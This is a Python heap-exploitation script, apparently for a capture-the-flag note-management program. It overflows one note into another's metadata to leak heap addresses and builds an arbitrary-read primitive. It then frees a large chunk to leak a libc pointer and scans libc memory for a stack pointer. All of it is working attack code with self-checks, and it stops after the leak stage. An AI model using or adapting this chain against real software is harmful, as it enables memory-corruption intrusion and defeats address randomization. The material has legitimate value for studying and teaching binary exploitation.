import importlib.util
spec=importlib.util.spec_from_file_location("pwnmod","pwn.py"); m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
T,p64,u64=m.T,m.p64,m.u64

t=T()
for i in range(8): t.C(i,0x18)
for i in range(8): t.W(i,0,bytes([0x41+i])*8)

# heap leak: over-read note1 via note0 off 0x28 -> size big; struct note2.data is at dump+0x20
t.W(0,0x28,p64(0x400))
d=t.R(1)[:0x400]
note2_data=u64(d[0x20:0x28])
d1=note2_data-0x40
print(f"[leak] note2.data=0x{note2_data:012x}  d1=0x{d1:012x}  heapbase~0x{d1&~0xfff:012x}")

# arbitrary read primitive via note1 (controlled from note0 off 0x20)
def arb(addr,size=0x100):
    t.W(0,0x20,p64(addr)+p64(size))
    return t.R(1)[:size]

# verify: read d1 -> should be 'BBBBBBBB'
v=arb(d1,0x18)
print("[verify] read d1:",v[:16], "OK" if v[:8]==b'BBBBBBBB' else "FAIL")
# read note2.data -> should be 'CCCCCCCC'
v=arb(note2_data,0x18)
print("[verify] read note2.data:",v[:16], "OK" if v[:8]==b'CCCCCCCC' else "FAIL")

print("\n=== Step A: libc leak ===")
t.C(10,0x500)     # large chunk -> not tcache
t.C(11,0x18)      # guard against top consolidation
t.D(10)           # free -> unsorted bin, fd/bk = main_arena (libc)
heapbase=d1&~0xfff
libc_ptr=None
for base in range(heapbase, heapbase+0x3000, 0x400):
    win=arb(base,0x400)
    for o in range(0,len(win)-8,8):
        v=u64(win[o:o+8])
        if 0x7f0000000000<=v<0x7fffffffffff:
            print(f"  found 0x7f ptr at 0x{base+o:012x}: 0x{v:012x}")
            libc_ptr=v; break
    if libc_ptr: break
print("[libc_ptr]", hex(libc_ptr) if libc_ptr else "NOT FOUND")

print("\n=== Step C: find stack ptr (environ) in libc data ===")
lp=libc_ptr&~0xfff
stack_ptr=None; stack_at=None
# scan a window around the leaked libc data ptr for a stack-range value
for base in range(lp-0x2000, lp+0xa000, 0x400):
    try:
        win=arb(base,0x400)
    except Exception as e:
        print("read crash at",hex(base),e); break
    for o in range(0,len(win)-8,8):
        v=u64(win[o:o+8])
        if 0x7ffc00000000<=v<=0x7fffffffffff:
            print(f"  stackptr 0x{v:012x} @ 0x{base+o:012x}")
            if stack_ptr is None: stack_ptr=v; stack_at=base+o
    # don't break; collect a few
print("[environ-ish stack_ptr]", hex(stack_ptr) if stack_ptr else "NONE")
